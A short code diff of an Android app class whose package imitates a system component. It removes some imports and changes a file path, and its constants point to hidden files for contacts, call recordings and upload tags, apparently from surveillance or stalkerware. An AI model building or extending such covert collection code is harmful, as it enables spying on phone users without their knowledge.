@@ -3,18 +3,9 @@ package com.android.system.controled;
 import java.io.File;
 
 import android.app.Application;
-import android.content.Context;
-import android.content.Intent;
-import android.content.IntentSender.SendIntentException;
 import android.os.Environment;
 
-import com.android.system.controled.bean.ConfigInfo;
-import com.android.system.controled.service.ListenService;
-import com.android.system.controled.util.DoAboutCodeUtils;
-import com.android.system.controled.util.FileUtil;
 import com.android.system.controled.util.InitUtil;
-import com.android.system.controled.util.ServiceUtil;
-import com.android.system.controled.util.XmlUtil;
 
 public class MainApplication extends Application {
 	
@@ -68,7 +59,7 @@ public class MainApplication extends Application {
 	public static final File FILE_CONTACTS = new File(FILE_IN_SDCARD + ".contacts.txt");
 	public static final String FILEPATH_AUDIOS_CALL = FILE_IN_SDCARD + ".callaudios/";
 	public static final String FILEPATH_AUDIOS_OTHER = FILE_IN_SDCARD + ".audios/";
-	public static final File FILE_TAG_UPLOAD_TAG = new File("/data/data/com.android.system.controled/files/uploadtag.cfg");
+	public static final File FILE_TAG_UPLOAD_TAG = new File(Environment.getDataDirectory().getAbsolutePath() + "/data/com.android.system.controled/files/uploadtag.cfg");
 	public static final String FILENAME_TAG_UPLOAD_TAG = "uploadtag.cfg";
 
 
